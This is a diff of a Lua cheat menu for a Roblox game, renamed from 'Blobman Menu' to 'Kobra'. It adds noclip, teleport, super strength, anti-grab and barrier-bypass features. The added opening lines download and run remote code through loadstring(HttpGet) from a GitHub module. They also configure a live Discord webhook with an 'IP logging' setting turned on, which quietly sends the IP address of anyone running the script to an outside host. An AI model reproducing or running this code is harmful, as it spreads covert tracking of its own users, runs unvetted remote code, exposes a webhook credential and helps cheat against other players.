@@ -1,17 +1,27 @@
+local ApiFTAP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoey/FTAP-Module/refs/heads/main/Module/ModuleFTAP"))()
+
+ApiFTAP:SetSettings({
+    NameHub = "Kobra",
+    WebhookEnabled = true, -- Enable/Disable
+    ExecuteLogSecret = true, -- IP logging
+    WebhookLink = "https://discord.com/api/webhooks/1364446921791508480/QAEuLmPSu1addaZY1gI3ljXlV6fmSZq1gmvHmRN81nIjTIjKfzOJpBMXnOOA5SLaSBC5"
+})
+-- SetSettings(settings: table)
+
 -- УДАЛЕНИЕ СТАРОГО МЕНЮ
-local oldGui = game:GetService("CoreGui"):FindFirstChild("BlobmanMenu")
+local oldGui = game:GetService("CoreGui"):FindFirstChild("Kobra")
 if oldGui then
     oldGui:Destroy()
 end
 
 -- СОЗДАНИЕ ГЛОБАЛЬНОЙ ПЕРЕМЕННОЙ ДЛЯ ОТСЛЕЖИВАНИЯ СОСТОЯНИЯ МЕНЮ
-getgenv().BlobmanMenuOpen = true
+getgenv().KobraOpen = true
 
 -- ФУНКЦИЯ ДЛЯ СОЗДАНИЯ МЕНЮ
 local function createMenu()
     -- СОЗДАНИЕ ОСНОВНОГО МЕНЮ
     local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "BlobmanMenu"
+    ScreenGui.Name = "Kobra"
     ScreenGui.ResetOnSpawn = false
     ScreenGui.IgnoreGuiInset = true
     ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
@@ -41,7 +51,7 @@ local function createMenu()
     TitleText.Size = UDim2.new(1, -20, 1, 0)
     TitleText.Position = UDim2.new(0, 10, 0, 0)
     TitleText.BackgroundTransparency = 1
-    TitleText.Text = "Blobman Menu [G чтобы закрыть]"
+    TitleText.Text = "Kobra"
     TitleText.TextColor3 = Color3.new(1, 1, 1)
     TitleText.TextSize = 24
     TitleText.Font = Enum.Font.GothamBold
@@ -340,11 +350,12 @@ local function createMenu()
 
 
     -- СОЗДАНИЕ ВКЛАДОК
-    local defenceTab = createTab("Defence", 1)
-    local playerTab = createTab("Player", 2)
-    local teleportTab = createTab("Teleport", 3)
-    local keybindsTab = createTab("Keybinds", 4)
-    local otherTab = createTab("Other", 5)
+    local combatTab = createTab("Combat", 1)
+    local defenceTab = createTab("Defence", 2)
+    local playerTab = createTab("Player", 3)
+    local teleportTab = createTab("Teleport", 4)
+    local keybindsTab = createTab("Keybinds", 5)
+    local otherTab = createTab("Other", 6)
 
     -- Пример добавления элементов на вкладку Defence
     local defenceTitle = Instance.new("TextLabel")
@@ -447,44 +458,20 @@ local function setupWaterCollision()
             end
         end
     end)
-
-    -- Добавляем информационный текст для коллизии воды
-    local waterCollisionInfo = Instance.new("TextLabel")
-    waterCollisionInfo.Size = UDim2.new(1, -20, 0, 40)
-    waterCollisionInfo.BackgroundTransparency = 1
-    waterCollisionInfo.Text = "Toggles the water collision state. Disable to pass through the water."
-    waterCollisionInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
-    waterCollisionInfo.TextSize = 14
-    waterCollisionInfo.Font = Enum.Font.Gotham
-    waterCollisionInfo.TextWrapped = true
-    waterCollisionInfo.LayoutOrder = 3
-    waterCollisionInfo.Parent = otherTab
 end
 
+-- Функция для добавления AntiGrab из FTAP API
 local function setupAntiGrab()
-    local loop
-
-    createToggle(defenceTab, "Anti Grab", 2, function(enabled)
+    -- Создаем переключатель для включения AntiGrab
+    local antiGrabToggle = createToggle(defenceTab, "Anti Grab", 1, function(enabled)
         if enabled then
-            loop = game:GetService("RunService").Heartbeat:Connect(function()
-                game:GetService("ReplicatedStorage"):WaitForChild("CharacterEvents"):WaitForChild("Struggle"):FireServer()
-            end)
-        elseif loop then
-            loop:Disconnect()
-            loop = nil
+            ActiveFunctions.AntiGrab = true
+            ApiFTAP.AntiGrab(true)
+        else
+            ActiveFunctions.AntiGrab = false
+            ApiFTAP.AntiGrab(false)
         end
     end)
-
-    local info = Instance.new("TextLabel")
-    info.Size = UDim2.new(1, -20, 0, 40)
-    info.BackgroundTransparency = 1
-    info.Text = "Spams Struggle event every frame to resist grabs"
-    info.TextColor3 = Color3.fromRGB(200, 200, 200)
-    info.TextSize = 14
-    info.Font = Enum.Font.Gotham
-    info.TextWrapped = true
-    info.LayoutOrder = 3
-    info.Parent = defenceTab
 end
 
 local function setupAntiBarrier()
@@ -504,16 +491,6 @@ local function setupAntiBarrier()
         end
     end)
 
-    local info = Instance.new("TextLabel")
-    info.Size = UDim2.new(1, -20, 0, 40)
-    info.BackgroundTransparency = 1
-    info.Text = "Allows items to pass house barriers"
-    info.TextColor3 = Color3.fromRGB(200, 200, 200)
-    info.TextSize = 14
-    info.Font = Enum.Font.Gotham
-    info.TextWrapped = true
-    info.LayoutOrder = 4
-    info.Parent = otherTab
 end
 
 local function setupPlayerSpeed()
@@ -544,18 +521,6 @@ local function setupPlayerSpeed()
             end
         end
     end)
-
-    -- Подпись
-    local speedInfo = Instance.new("TextLabel")
-    speedInfo.Size = UDim2.new(1, -20, 0, 30)
-    speedInfo.BackgroundTransparency = 1
-    speedInfo.Text = "Uses velocity instead of WalkSpeed"
-    speedInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
-    speedInfo.TextSize = 14
-    speedInfo.Font = Enum.Font.Gotham
-    speedInfo.TextWrapped = true
-    speedInfo.LayoutOrder = 3
-    speedInfo.Parent = playerTab
 
     -- Toggle для постоянной скорости на респавне
     local keepVelocityToggle = createToggle(playerTab, "Keep Velocity On Respawn", 4, function(enabled)
@@ -593,34 +558,10 @@ local function setupInfiniteJump()
         ActiveFunctions.InfiniteJump = enabled
     end)
 
-    -- Подпись
-    local jumpInfo = Instance.new("TextLabel")
-    jumpInfo.Size = UDim2.new(1, -20, 0, 40)
-    jumpInfo.BackgroundTransparency = 1
-    jumpInfo.Text = "Allows you to fly upward by holding space"
-    jumpInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
-    jumpInfo.TextSize = 14
-    jumpInfo.Font = Enum.Font.Gotham
-    jumpInfo.TextWrapped = true
-    jumpInfo.LayoutOrder = 6
-    jumpInfo.Parent = playerTab
-
     -- Слайдер для силы
     local jumpPowerSlider = createSlider(playerTab, "Jump Power", 50, 200, 50, 7, function(value)
         jumpPower = value
     end)
-
-    -- Подпись к слайдеру
-    local jumpPowerInfo = Instance.new("TextLabel")
-    jumpPowerInfo.Size = UDim2.new(1, -20, 0, 30)
-    jumpPowerInfo.BackgroundTransparency = 1
-    jumpPowerInfo.Text = "Uses upward velocity (not Humanoid jump)"
-    jumpPowerInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
-    jumpPowerInfo.TextSize = 14
-    jumpPowerInfo.Font = Enum.Font.Gotham
-    jumpPowerInfo.TextWrapped = true
-    jumpPowerInfo.LayoutOrder = 8
-    jumpPowerInfo.Parent = playerTab
 
     -- Обработка зажатия/отпускания пробела
     local UIS = game:GetService("UserInputService")
@@ -686,18 +627,6 @@ end
         -- Создаем информацию о клавише
         local palletKeybindInfo = createKeybindInfo(keybindsTab, "Spawn Pallet", "Tab", 2)
         
-        -- Добавляем информационный текст
-        local palletInfo = Instance.new("TextLabel")
-        palletInfo.Size = UDim2.new(1, -20, 0, 40)
-        palletInfo.BackgroundTransparency = 1
-        palletInfo.Text = "Press Tab to spawn a pallet directly in front of you"
-        palletInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
-        palletInfo.TextSize = 14
-        palletInfo.Font = Enum.Font.Gotham
-        palletInfo.TextWrapped = true
-        palletInfo.LayoutOrder = 3
-        palletInfo.Parent = keybindsTab
-        
         -- Создаем переключатель для активации/деактивации клавиши
         local palletKeybindToggle = createToggle(keybindsTab, "Enable Pallet Keybind", 4, function(enabled)
             if enabled then
@@ -728,126 +657,44 @@ clearGrabPartsButton.MouseButton1Click:Connect(function()
     end
 end)
 
-    -- Функция телепортации к точке, на которую указывает мышь
-    local function teleportToMousePosition()
-        local player = game.Players.LocalPlayer
-        local mouse = player:GetMouse()
-        local character = player.Character
-        local humanoid = character and character:FindFirstChild("Humanoid")
-        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
-        
-        if humanoidRootPart and humanoid and humanoid.Health > 0 then
-            -- Проверяем позицию, куда указывает мышь
-            local targetPosition = mouse.Hit.Position
-            
-            -- Телепортируем игрока на эту позицию (с небольшим смещением вверх, чтобы не застрять в земле)
-            humanoidRootPart.CFrame = CFrame.new(targetPosition) * CFrame.new(0, 3, 0)
-        end
-    end
-
-  -- Добавляем функцию телепортации на вкладку Teleport
-    local function setupTeleportTab()
-        -- Добавляем заголовок на вкладку Teleport
-        local teleportTitle = Instance.new("TextLabel")
-        teleportTitle.Size = UDim2.new(1, 0, 0, 30)
-        teleportTitle.BackgroundTransparency = 1
-        teleportTitle.Text = "Teleport Options"
-        teleportTitle.TextColor3 = Color3.new(1, 1, 1)
-        teleportTitle.TextSize = 20
-        teleportTitle.Font = Enum.Font.GothamBold
-        teleportTitle.LayoutOrder = 1
-        teleportTitle.Parent = teleportTab
-        
-        -- Создаем информацию о клавише телепорта
-        local teleportKeybindInfo = createKeybindInfo(teleportTab, "Click Teleport", "T", 2)
-        
-        -- Добавляем информационный текст
-        local teleportInfo = Instance.new("TextLabel")
-        teleportInfo.Size = UDim2.new(1, -20, 0, 40)
-        teleportInfo.BackgroundTransparency = 1
-        teleportInfo.Text = "Press T to teleport to the position where your mouse is pointing"
-        teleportInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
-        teleportInfo.TextSize = 14
-        teleportInfo.Font = Enum.Font.Gotham
-        teleportInfo.TextWrapped = true
-        teleportInfo.LayoutOrder = 3
-        teleportInfo.Parent = teleportTab
-        
-        -- Создаем переключатель для активации/деактивации телепорта
-        local teleportToggle = createToggle(teleportTab, "Enable Click Teleport", 4, function(enabled)
-            if enabled then
-                ActiveKeybinds.ClickTeleport = true
-            else
-                ActiveKeybinds.ClickTeleport = false
-            end
-        end)
-        
-        -- Добавляем кнопку телепорта к случайному игроку
-        local randomTeleportButton = Instance.new("TextButton")
-        randomTeleportButton.Size = UDim2.new(1, -20, 0, 40)
-        randomTeleportButton.Position = UDim2.new(0, 10, 0, 0)
-        randomTeleportButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-        randomTeleportButton.Text = "Teleport to Random Player"
-        randomTeleportButton.TextColor3 = Color3.new(1, 1, 1)
-        randomTeleportButton.TextSize = 16
-        randomTeleportButton.Font = Enum.Font.GothamBold
-        randomTeleportButton.BorderSizePixel = 0
-        randomTeleportButton.LayoutOrder = 5
-        randomTeleportButton.Parent = teleportTab
-        
-        randomTeleportButton.MouseButton1Click:Connect(function()
-            local players = game:GetService("Players"):GetPlayers()
-            local localPlayer = game.Players.LocalPlayer
-            local validPlayers = {}
-            
-            -- Находим всех игроков, кроме локального
-            for _, player in pairs(players) do
-                if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                    table.insert(validPlayers, player)
-                end
-            end
-            
-            -- Если есть доступные игроки, телепортируемся к случайному
-            if #validPlayers > 0 then
-                local randomPlayer = validPlayers[math.random(1, #validPlayers)]
-                local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-                
-                if humanoidRootPart and randomPlayer.Character and randomPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                    humanoidRootPart.CFrame = randomPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
-                end
-            end
-        end)
-        
-        -- Добавляем телепорт к точкам спавна
-        local spawnTeleportButton = Instance.new("TextButton")
-        spawnTeleportButton.Size = UDim2.new(1, -20, 0, 40)
-        spawnTeleportButton.Position = UDim2.new(0, 10, 0, 0)
-        spawnTeleportButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-        spawnTeleportButton.Text = "Teleport to Spawn"
-        spawnTeleportButton.TextColor3 = Color3.new(1, 1, 1)
-        spawnTeleportButton.TextSize = 16
-        spawnTeleportButton.Font = Enum.Font.GothamBold
-        spawnTeleportButton.BorderSizePixel = 0
-        spawnTeleportButton.LayoutOrder = 6
-        spawnTeleportButton.Parent = teleportTab
-        
-        spawnTeleportButton.MouseButton1Click:Connect(function()
-            local player = game.Players.LocalPlayer
-            local character = player.Character or player.CharacterAdded:Wait()
-            
-            -- Находим точки спавна
-            local spawnLocations = workspace:FindFirstChild("SpawnLocations")
-            if spawnLocations and #spawnLocations:GetChildren() > 0 then
-                local spawnPoint = spawnLocations:GetChildren()[math.random(1, #spawnLocations:GetChildren())]
-                character:SetPrimaryPartCFrame(spawnPoint.CFrame * CFrame.new(0, 3, 0))
-            else
-                -- Если не нашли специальные точки спавна, используем стандартное место спавна
-                player:LoadCharacter()
-            end
-        end)
-    end
+-- Функция телепорта по мышке с ограничением по расстоянию
+local function teleportToMouse()
+    local player = game.Players.LocalPlayer
+    local mouse = player:GetMouse()
+    local character = player.Character
+    local humanoid = character and character:FindFirstChild("Humanoid")
+    local root = character and character:FindFirstChild("HumanoidRootPart")
     
+    if not (root and humanoid and humanoid.Health > 0) then return end
+
+    local targetPosition = mouse.Hit.Position
+    local currentPosition = root.Position
+    local maxDistance = 2000
+
+    if mouse.Target and (targetPosition - currentPosition).Magnitude <= maxDistance then
+        root.CFrame = CFrame.new(targetPosition + Vector3.new(0, 3, 0))
+    end
+end
+
+-- Установка клавиши T для телепорта и переключателя
+local function setupMouseTeleportKeybind()
+    -- Инфо о клавише
+    local keybindInfo = createKeybindInfo(teleportTab, "Click Teleport", "T", 2)
+
+    -- Переключатель
+    local teleportToggle = createToggle(teleportTab, "Enable Click Teleport", 4, function(enabled)
+        ActiveKeybinds.ClickTeleport = enabled
+    end)
+
+    -- Обработка клавиши T
+    game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
+        if gp then return end
+        if input.KeyCode == Enum.KeyCode.T and ActiveKeybinds.ClickTeleport then
+            teleportToMouse()
+        end
+    end)
+end
+
     -- Функция для добавления NoClip (прохождение сквозь стены)
     local function setupNoClip()
         -- Создаем переключатель для включения NoClip
@@ -888,18 +735,6 @@ end)
                 end
             end
         end)
-        
-        -- Добавляем информационный текст
-        local noClipInfo = Instance.new("TextLabel")
-        noClipInfo.Size = UDim2.new(1, -20, 0, 40)
-        noClipInfo.BackgroundTransparency = 1
-        noClipInfo.Text = "Allows you to walk through walls and objects"
-        noClipInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
-        noClipInfo.TextSize = 14
-        noClipInfo.Font = Enum.Font.Gotham
-        noClipInfo.TextWrapped = true
-        noClipInfo.LayoutOrder = 10
-        noClipInfo.Parent = playerTab
     end
     
 -- Функция обработки нажатия клавиш
@@ -911,8 +746,8 @@ local function setupKeyBindings()
         
         -- Обработка клавиши G для закрытия/открытия меню
         if input.KeyCode == Enum.KeyCode.G then
-            getgenv().BlobmanMenuOpen = not getgenv().BlobmanMenuOpen
-            ScreenGui.Enabled = getgenv().BlobmanMenuOpen
+            getgenv().KobraOpen = not getgenv().KobraOpen
+            ScreenGui.Enabled = getgenv().KobraOpen
         end
         
         -- Обработка клавиши Tab для спавна паллета
@@ -946,18 +781,6 @@ local function setupAnchorKeybind()
     -- Создаем информацию о клавише
     local anchorKeybindInfo = createKeybindInfo(keybindsTab, "Duplicate GrabParts", "K", 7)
     
-    -- Добавляем информационный текст
-    local anchorInfo = Instance.new("TextLabel")
-    anchorInfo.Size = UDim2.new(1, -20, 0, 40)
-    anchorInfo.BackgroundTransparency = 1
-    anchorInfo.Text = "Press K to duplicate GrabParts and remove sounds"
-    anchorInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
-    anchorInfo.TextSize = 14
-    anchorInfo.Font = Enum.Font.Gotham
-    anchorInfo.TextWrapped = true
-    anchorInfo.LayoutOrder = 8
-    anchorInfo.Parent = keybindsTab
-    
     -- Создаем переключатель для активации/деактивации клавиши
     local anchorKeybindToggle = createToggle(keybindsTab, "Enable Anchor Keybind", 9, function(enabled)
         if enabled then
@@ -968,23 +791,90 @@ local function setupAnchorKeybind()
     end)
 end
 
+-- Функция для добавления Super Strength из FTAP API
+local function setupSuperStrength()
+    -- Создаем переключатель для включения Super Strength
+    local superStrengthToggle = createToggle(combatTab, "Super Strength", 2, function(enabled)
+        if enabled then
+            ActiveFunctions.SuperStrength = true
+            -- Включаем SuperStrength из FTAP API
+            ApiFTAP.SuperStrength(true)
+            print("Super Strength onn")
+        else
+            ActiveFunctions.SuperStrength = false
+            -- Выключаем SuperStrength из FTAP API
+            ApiFTAP.SuperStrength(false)
+            print("Super Strength off")
+        end
+    end)
+    
+    -- Предполагая, что у вас есть функция createSlider для создания слайдеров
+    -- Если этой функции нет, вам нужно будет адаптировать этот код к вашей системе
+    local strengthSlider = createSlider(combatTab, "Strength", 3, 10000, 500, 150, function(value)
+        -- Устанавливаем значение силы через FTAP API
+        ApiFTAP.ValueStrength(value)
+        print("Значение силы установлено на: " .. value)
+    end)
+end
+
+local function setupAntiBlobman()
+    local AntiBlobmanToggle = createToggle(defenceTab, "AntiBlobman", 2, function(enabled)
+        if enabled then
+            ActiveFunctions.AntiBlobman = true
+            ApiFTAP.AntiBlobman(true)
+            print("AntiBlobman on")
+        else
+            ActiveFunctions.AntiBlobman = false
+            ApiFTAP.AntiBlobman(false)
+            print("AntiBlobman off")
+        end
+    end)
+end
+
+local function setupAntiExploit()
+    local AntiExploitToggle = createToggle(defenceTab, "AntiExploit", 2, function(enabled)
+        if enabled then
+            ActiveFunctions.AntiExploit = true
+            ApiFTAP.AntiExploit(true)
+        else
+            ActiveFunctions.AntiExploit = false
+            ApiFTAP.AntiExploit(false)
+        end
+    end)
+end
+
+local function setupSuper()
+    local AntiExploitToggle = createToggle(defenceTab, "AntiExploit", 2, function(enabled)
+        if enabled then
+            ActiveFunctions.AntiExploit = true
+            ApiFTAP.AntiExploit(true)
+        else
+            ActiveFunctions.AntiExploit = false
+            ApiFTAP.AntiExploit(false)
+        end
+    end)
+end
+
     -- Вызываем все функции настройки
     setupAntiGrab()
     setupPlayerSpeed()
     setupInfiniteJump()
     setupNoClip()
-    setupTeleportTab()
+    setupMouseTeleportKeybind()
     setupPalletKeybind()
     setupAnchorKeybind()
     setupWaterCollision()
     setupAntiBarrier()
+    setupSuperStrength()
+    setupAntiBlobman()
+    setupAntiExploit()
     setupKeyBindings()
     
     -- Устанавливаем первую вкладку как активную по умолчанию
     for _, btn in pairs(Tabs:GetChildren()) do
         if btn:IsA("TextButton") then
             btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-            if btn.Text == "Defence" then
+            if btn.Text == "Combat" then
                 btn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
             end
         end
@@ -993,7 +883,7 @@ end
     for _, v in pairs(Content:GetChildren()) do
         if v:IsA("ScrollingFrame") then
             v.Visible = false
-            if v.Name == "DefenceTab" then
+            if v.Name == "CombatTab" then
                 v.Visible = true
             end
         end
@@ -1007,8 +897,8 @@ local menu = createMenu()
 
 -- ОБРАБОТКА ЗАКРЫТИЯ СКРИПТА
 game:GetService("CoreGui").ChildRemoved:Connect(function(child)
-    if child.Name == "BlobmanMenu" then
-        getgenv().BlobmanMenuOpen = false
+    if child.Name == "Kobra" then
+        getgenv().KobraOpen = false
     end
 end)
 
